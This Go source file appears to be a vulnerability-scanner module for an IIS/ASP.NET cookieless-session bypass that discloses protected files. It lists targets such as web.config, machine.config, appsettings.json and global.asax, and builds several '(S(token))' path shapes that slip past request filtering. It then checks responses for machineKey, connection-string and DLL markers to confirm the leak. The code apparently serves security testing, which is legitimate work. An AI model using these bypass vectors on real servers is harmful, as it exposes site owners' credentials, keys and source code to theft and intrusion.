package iis_cookieless_source_disclosure

import (
	"strings"
)

// artifactKind classifies the protected file we are trying to disclose.
type artifactKind int

const (
	kindConfig artifactKind = iota // ASP.NET/IIS XML/JSON configuration
	kindSource                     // managed source (global.asax, .cs, .vb)
	kindBinary                     // compiled assembly (.dll)
)

// target is a well-known, high-value file that IIS normally refuses to serve.
type target struct {
	rel  string // path relative to web root, no leading slash
	kind artifactKind
	name string // human label
}

// targets are named files whose disclosure is high-impact. Arbitrary /bin
// assemblies and App_Code source names are surfaced separately by the
// iis-shortname-discovery module, which feeds their real URLs into the scan.
var targets = []target{
	{"web.config", kindConfig, "web.config"},
	{"web.config.bak", kindConfig, "web.config backup"},
	{"web.config.old", kindConfig, "web.config backup"},
	{"machine.config", kindConfig, "machine.config"},
	{"connectionStrings.config", kindConfig, "connectionStrings.config"},
	{"appsettings.json", kindConfig, "appsettings.json"},
	{"PrecompiledApp.config", kindConfig, "PrecompiledApp.config"},
	{"global.asax", kindSource, "global.asax"},
}

// buildVector returns the request path for a given cookieless bypass "shape"
// applied to rel, and whether that shape applies. token is the throwaway
// cookieless session token (its contents are irrelevant — IIS/ASP.NET strips
// the whole (S(...)) segment during path processing, which is what evades the
// request-filtering rule that would otherwise block the file).
func buildVector(rel string, shape int, token string) (string, bool) {
	tok := "(S(" + token + "))"
	switch shape {
	case 0:
		// Cookieless prefix: flips the request into cookieless mode so the token
		// segment is stripped after request filtering has already been evaluated.
		return "/" + tok + "/" + rel, true
	case 1:
		// Token segment followed by a traversal back to the real file.
		return "/" + tok + "/../" + rel, true
	case 2:
		// Two stacked token segments.
		return "/" + tok + "/" + tok + "/" + rel, true
	case 3:
		// In-segment split of the FIRST path element, breaking a hidden-segment
		// filter (e.g. "bin" -> "b(S(x))in"). Only meaningful when rel has a
		// directory component.
		if i := strings.IndexByte(rel, '/'); i > 1 {
			seg := rel[:i]
			mid := len(seg) / 2
			return "/" + seg[:mid] + tok + seg[mid:] + rel[i:], true
		}
		return "", false
	}
	return "", false
}

// numVectorShapes is the count of shapes buildVector understands.
const numVectorShapes = 4

// confirmArtifact reports whether body is genuinely the protected artifact of
// the given kind (not a themed error page that merely mentions it), returning
// the evidence markers that matched.
func confirmArtifact(kind artifactKind, body string) (bool, []string) {
	low := strings.ToLower(body)
	switch kind {
	case kindConfig:
		// JSON config (appsettings.json) is structurally different from XML.
		if strings.Contains(low, "connectionstrings") && strings.Contains(low, "{") && strings.Contains(low, "}") &&
			!strings.Contains(low, "<html") {
			return true, []string{"connectionStrings (JSON)"}
		}
		if !strings.Contains(low, "<configuration") {
			return false, nil
		}
		var ev []string
		for _, marker := range []string{"machinekey", "connectionstring", "<system.web", "<system.webserver", "<appsettings", "<authentication", "add key="} {
			if strings.Contains(low, marker) {
				ev = append(ev, marker)
			}
		}
		if len(ev) == 0 {
			return false, nil
		}
		return true, ev
	case kindSource:
		for _, marker := range []string{"<%@ application", "application_start", "void application_", "<%@ page", "namespace ", "public class "} {
			if strings.Contains(low, marker) {
				return true, []string{marker}
			}
		}
		return false, nil
	case kindBinary:
		// PE executable/DLL magic "MZ".
		if len(body) >= 2 && body[0] == 'M' && body[1] == 'Z' {
			return true, []string{"PE header (MZ)"}
		}
		return false, nil
	}
	return false, nil
}

// extOfRel returns the extension of a relative path (with leading dot) for
// building same-shaped decoy names.
func extOfRel(rel string) string {
	base := rel
	if i := strings.LastIndexByte(rel, '/'); i >= 0 {
		base = rel[i+1:]
	}
	if p := strings.LastIndexByte(base, '.'); p > 0 {
		return base[p:]
	}
	return ""
}
